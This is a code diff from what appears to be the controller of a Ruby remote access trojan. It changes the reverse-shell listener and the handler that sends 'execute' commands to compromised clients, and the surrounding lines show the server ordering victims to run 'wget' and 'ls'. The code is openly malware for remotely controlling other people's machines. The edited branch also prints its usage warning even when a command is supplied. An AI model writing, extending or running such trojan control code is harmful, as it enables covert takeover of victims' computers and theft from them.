@@ -13,13 +13,9 @@ end
 
 # Function to interact with client reverse shells
 def drop_into_shell(port)
-  debug "Reverse shell listener started on port #{port}"
-  server = TCPServer.new('0.0.0.0', port)
-  loop do
-    client = server.accept
-    client.puts gets.chomp!
-    puts client.gets
-  end
+  debug "RubyCat listener started on port #{port}.\n\tWait a little bit for the connection to be completely established."
+  RubyRat::Helpers.listener(port)
+  return
 end
 
 class Server
@@ -229,8 +225,9 @@ def run
       server.send_client("wget #{action}", server.current_client)
       data = server.recv_client(server.current_client)
     when 'execute'
-      server.send_client("execute #{exec_cmd.gsub('execute ', '')}", server.current_client)
-      data = server.recv_client(server.current_client)
+      server.send_client("execute #{action}", server.current_client) if !action.nil?
+      data = server.recv_client(server.current_client) if !action.nil?
+      puts '[*] '.red + 'Please use execute with a command'
     when 'ls'
       server.send_client('ls', server.current_client)
       data = server.recv_client(server.current_client)
